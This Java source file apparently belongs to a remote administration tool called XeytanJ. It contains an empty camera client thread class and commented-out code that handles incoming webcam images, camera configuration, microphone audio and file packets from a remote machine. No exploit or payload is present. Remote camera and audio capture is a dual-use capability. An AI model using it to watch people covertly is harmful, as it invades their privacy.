package com.melardev.xeytanj.services.net.transport.p2p.services;


public class XeytanCameraClientThread {}

/*
    @Override
    public void handlePacket(Packet packet) {
        if (packet.getClass() == PacketMediaResponse.class) {
            PacketMediaResponse packetCamera = (PacketMediaResponse) packet;
            netClientService.onCameraImagePacketReceived(packetCamera.getImage());

        } else if (packet.getClass() == PacketCameraConfigResponse.class) {
            PacketCameraConfigResponse packetCamera = (PacketCameraConfigResponse) packet;
            netClientService.onCameraConfigInfoReceived(packetCamera.getScreenDeviceInfoList());
        } else if (packet.getClass() == PacketVoice.class)
            netClientService.onCameraAudioPacketReceived(((PacketVoice) packet).data, ((PacketVoice) packet).bytesRead);
*/ /*else if (packet.getClass() == PacketFile.class) {
            if (filesRecord.size() < 10) {
                filesRecord.offer((PacketFile) packet);
            } else {
                filesRecord.poll();
                filesRecord.offer((PacketFile) packet);
            }
        }

}
}
*/